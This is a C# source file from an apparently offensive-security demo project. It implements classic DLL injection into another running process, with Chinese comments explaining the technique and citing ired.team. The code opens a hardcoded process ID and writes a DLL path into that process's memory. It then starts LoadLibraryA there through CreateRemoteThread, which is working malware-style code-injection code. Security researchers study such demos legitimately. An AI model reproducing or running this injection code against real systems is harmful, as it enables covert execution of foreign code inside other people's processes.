// Author: bopin (@bopin2020)
// Project: ProcessInjecting (https://github.com/bopin2020/ProcessInjecting)
// License: GNU GPLv3

using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Vanara.PInvoke;
using static Vanara.PInvoke.Kernel32;
using static Vanara.PInvoke.StructHelper;

namespace ProcessInjectionDemo
{
    /// <summary>
    /// https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection
    /// 标准dll注入; 手法和shellcode注入类似   不过需要将dll路径写入到内存中并在创建线程中指定线程启始路径 和 线程参数
    /// </summary>
    partial class DllInjection
    {

    }
    partial class DllInjection
    {
        public static void Run()
        {
            string dllpath = @"c:\users\James\Desktop\StandardDll.dll";
            var p = OpenProcess(ACCESS_MASK.GENERIC_ALL, false, 17880);
            // 这种做法需要在目标进程 分配线程参数这部分内存，比较敏感
            // 这篇文章提出了利用进程本身搜索指定的字符串，然后将dll放到 system32目录下让系统自己加载
            // https://www.cnblogs.com/mayingkun/p/11933920.html
            var addr = VirtualAllocEx(p, IntPtr.Zero, dllpath.Length, MEM_ALLOCATION_TYPE.MEM_COMMIT, MEM_PROTECTION.PAGE_READWRITE);

            SizeT size;
            var status = WriteProcessMemory(p, addr,Encoding.UTF8.GetBytes(dllpath), dllpath.Length,out size);

            IntPtr ladd = GetProcAddress(GetModuleHandle("kernel32"), "LoadLibraryA");

            Console.WriteLine(ladd.ToString("x"));
            Console.WriteLine(addr.ToString("x"));

            // var tp = Marshal.GetDelegateForFunctionPointer<ThreadProc>(ladd);

            uint threadId;
            CreateRemoteThread(p, null, 0,ladd, addr,CREATE_THREAD_FLAGS.RUN_IMMEDIATELY,out threadId);
            
            Console.WriteLine(threadId);
        }
    }
}
